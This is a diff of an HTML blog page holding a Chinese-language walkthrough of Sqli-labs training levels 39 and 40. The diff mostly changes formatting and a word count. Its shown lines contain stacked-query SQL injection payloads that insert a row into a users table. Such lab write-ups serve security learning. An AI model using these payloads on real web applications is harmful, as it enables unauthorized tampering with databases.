@@ -85,7 +85,7 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    4.9k
+                    4.8k
                 </span>
                 
                 
@@ -195,11 +195,12 @@
 <p>去数据库查询时，已经成功插入</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/31-40/8-1.png" alt></p>
 <h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>本关与上一关区别只在于参数没有被包括，payload：</p>
-<pre><code>?id=1;insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+
-</code></pre><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>本关与上一关区别只在于参数被<code>(&#39;&#39;)</code>包裹，payload：</p>
-<pre><code>?id=1&#39;);insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+
-</code></pre><p>至此，31-40关的Write-up结束</p>
-<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/02/Sqli-labs%20%E7%AC%AC41-50%E5%85%B3/">第41-50关Write-up</a></p>
+<pre><code class="Code">?id=1;insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+
+</code></pre>
+<h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>本关与上一关区别只在于参数被<code>(&#39;&#39;)</code>包裹，payload：</p>
+<pre><code class="Code">?id=1&#39;);insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+
+</code></pre>
+<p>至此，31-40关的 Write-up 结束</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
